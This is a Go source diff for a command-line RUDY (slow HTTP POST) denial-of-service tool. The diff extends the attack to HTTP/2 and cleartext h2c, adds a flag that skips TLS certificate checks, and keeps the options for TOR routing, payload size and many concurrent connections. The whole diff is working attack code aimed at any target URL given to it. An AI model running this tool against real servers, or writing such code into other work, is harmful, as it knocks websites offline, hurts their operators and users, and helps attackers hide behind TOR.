@@ -22,6 +22,8 @@ var (
 	method      string
 	headers     []string
 	url         string
+	protocol    string
+	insecure    bool
 )
 
 const defaultInterval = 10 * time.Second
@@ -37,9 +39,12 @@ func (*Run) SetFlags(flags *pflag.FlagSet) {
 	// Default ~1MB
 	flags.StringVarP(&size, "payload-size", "p", "1MB", "Random generated payload with the given size.")
 	flags.StringVarP(&tor, "tor", "t", "", "TOR endpoint (either socks5://1.1.1.1:1234, or 1.1.1.1:1234).")
-	flags.StringVarP(&method, "method", "m", http.MethodPost, "GET")
+	flags.StringVarP(&method, "method", "m", http.MethodPost, "HTTP method to use.")
 	headersParam := flags.StringSlice("header", nil, "Content-Type:application/json")
 	flags.StringVarP(&url, "url", "u", "", "Target URL to send the attack to.")
+	flags.StringVar(&protocol, "protocol", string(request.ProtocolHTTP1),
+		"HTTP protocol: http1 (chunked RUDY), http2 (TLS h2), h2c (cleartext HTTP/2).")
+	flags.BoolVarP(&insecure, "insecure", "k", false, "Skip TLS certificate verification (lab use).")
 
 	if headersParam != nil {
 		headers = *headersParam
@@ -63,7 +68,7 @@ func (*Run) GetDescription() string {
 
 // GetLongDescription returns the command long description.
 func (*Run) GetLongDescription() string {
-	return "Run the rudy attack on the target"
+	return "Run the rudy attack on the target (HTTP/1.1, HTTP/2 or h2c)"
 }
 
 // Info returns the command name.
@@ -81,24 +86,40 @@ func (*Run) Run() RunCmd {
 			panic(e)
 		}
 
+		proto := request.Protocol(protocol)
+		switch proto {
+		case request.ProtocolHTTP1, request.ProtocolHTTP2, request.ProtocolH2C:
+		default:
+			logger.Logger.Sugar().Fatalf(
+				"unsupported protocol %q (want http1, http2 or h2c)",
+				protocol,
+			)
+		}
+
 		waitgroup.Add(int(concurrents))
 
 		for range concurrents {
 			go func() {
+				defer waitgroup.Done()
+
 				if isize > math.MaxInt64 {
 					return
 				}
 
-				req := request.NewRequest(int64(isize), url, interval, method, headers)
-				if tor != "" {
-					req.WithTor(tor)
-				}
+				req := request.NewRequest(request.Options{
+					Size:     int64(isize),
+					URL:      url,
+					Delay:    interval,
+					Method:   method,
+					Headers:  headers,
+					Protocol: proto,
+					Insecure: insecure,
+					Tor:      tor,
+				})
 
-				if req.Send() == nil {
+				if err := req.Send(); err == nil {
 					logger.Logger.Sugar().Infof("Request successfully sent to %s", url)
 				}
-
-				waitgroup.Done()
 			}()
 		}
 
